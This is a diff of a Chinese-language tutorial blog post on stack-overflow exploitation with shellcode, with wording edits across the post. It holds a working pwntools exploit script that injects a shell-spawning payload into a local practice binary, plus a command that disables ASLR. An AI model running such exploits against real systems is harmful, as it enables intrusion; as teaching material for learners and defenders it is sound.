@@ -1,5 +1,5 @@
 ---
-title: Shellcode
+title: shellcode
 subtitle: 运行你自己的指令
 date: 2023-08-08T05:09:08+08:00
 draft: false
@@ -36,22 +36,22 @@ repost:
   url:
 ---
 
-在真正的漏洞利用中，你不太可能拥有 `win()` 函数。Shellcode 是一种允许 **运行你自己的
+在真正的漏洞利用中，你不太可能拥有 `win()` 函数。shellcode 是一种允许 **运行你自己的
 指令** 的方法，使你能够在系统上运行任意命令。
 
-**Shellcode** 本质上是 **汇编指令**，一旦我们将它输入到二进制文件中，它就会覆盖
-返回指针以劫持代码，指向并执行我们自己的指令。
+**shellcode** 本质上是 **一系列汇编指令**，一旦我们将它输入到二进制文件中，它就会覆盖返回
+地址（返回指针）以劫持代码，并执行我们自己的指令。
 
 <!--more-->
 
 {{<admonition type="warning">}}
 
 我保证你可以相信我，但你永远不应该在不知道 shellcode 作用的情况下运行它。
-Pwntools 很安全，并且几乎拥有你需要的所有 shellcode。
+pwntools 很安全，并且几乎拥有你需要的所有 shellcode 。
 
 {{</admonition>}}
 
-Shellcode 成功的原因是 [冯·诺伊曼结构](https://zh.wikipedia.org/wiki/%E5%86%AF%C2%B7%E8%AF%BA%E4%BC%8A%E6%9B%BC%E7%BB%93%E6%9E%84)（当今大多数计算机使用的体系结构）不区分
+shellcode 成功的原因是 [冯·诺伊曼结构](https://zh.wikipedia.org/wiki/%E5%86%AF%C2%B7%E8%AF%BA%E4%BC%8A%E6%9B%BC%E7%BB%93%E6%9E%84)（当今大多数计算机使用的体系结构）不区分
 数据和指令——无论你告诉它在哪里运行或运行什么内容，它都会尝试运行它。因此，
 即使我们输入的是攻击指令，计算机也不知道这一点，我们可以利用它来发挥我们的优势。
 
@@ -84,7 +84,7 @@ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 ## 0x02 确定缓冲区位置
 
 使用 `radare2` 调试 `vuln()` ，并找出缓冲区在内存中的起始位置；这就是我们
-想要将返回指针指向的位置。
+想要将返回地址指向的位置。
 
 ```bash
 $ r2 -d -A ./vuln
@@ -96,7 +96,7 @@ $ r2 -d -A ./vuln
 ```
 
 打印出来的这个值是一个 **局部变量**。根据它的大小，可以判断出它很可能是缓冲区。
-让我们在 `gets()` 之后设置一个断点并找到确切的地址。
+让我们在 `gets()` 之后设置一个断点并找到确切的返回地址。
 
 ```bash
 [0x08049172]> db 0x080491a8
@@ -115,7 +115,7 @@ INFO: hit breakpoint at: 0x80491a8
 
 ## 0x03 计算溢出 Padding
 
-现在我们需要计算溢出 Padding。我们将使用 De Bruijn 序列，如上一篇博客文章中所述。
+现在我们需要计算溢出 Padding 。我们将使用 De Bruijn 序列，如上一篇博客文章中所述。
 
 ```bash
 $ ragg2 -r -P 500
@@ -135,7 +135,7 @@ Overflow me
 
 为了使 shellcode 正确，我们将把 `context.binary` 设置为我们的二进制文件；
 这会获取诸如架构、操作系统和位数之类的东西，并使 pwntools 能够为我们提供
-shellcode。
+shellcode 。
 
 ```python
 from pwn import *
@@ -159,12 +159,11 @@ p = process()
 payload = asm(shellcraft.sh())
 # 溢出 Padding
 payload = payload.ljust(312, b'A')
-# Shellcode 的地址
+# 返回地址
 payload += p32(0xffffd6b4)
 ```
 
-现在让我们将其发送出去并使用 `p.interactive()`，它使我们能够与
-shell 通信。
+现在让我们将其发送出去并使用 `p.interactive()`，它使我们能够与 shell 通信。
 
 ```python
 log.info(p.clean())
@@ -210,11 +209,11 @@ context.binary = ELF('./vuln')
 
 p = process()
 
-# 构建 Shellcode
+# 构建 shellcode
 payload = asm(shellcraft.sh())
 # 溢出 Padding
 payload = payload.ljust(312, b'A')
-# Shellcode 的地址
+# 返回地址
 payload += p32(0xffffd6b4)
 
 log.info(p.clean())
@@ -226,9 +225,9 @@ p.interactive()
 
 ## 0x06 总结
 
-- 当提示输入时，我们注入了 shellcode（一系列汇编指令）
-- 然后，我们通过覆盖栈上保存的返回指针以指向我们的 shellcode
+- 当提示输入时，我们注入了 shellcode
+- 然后，我们通过覆盖栈上保存的返回地址以指向我们的 shellcode
 来劫持代码执行
-- 一旦返回指针弹出到 EIP 中，它就指向我们的 shellcode
+- 一旦返回地址压入 EIP 中，它就指向我们的 shellcode
 - 这导致程序执行我们的指令，为我们（在本例中）提供了用于执行
 任意命令的 shell
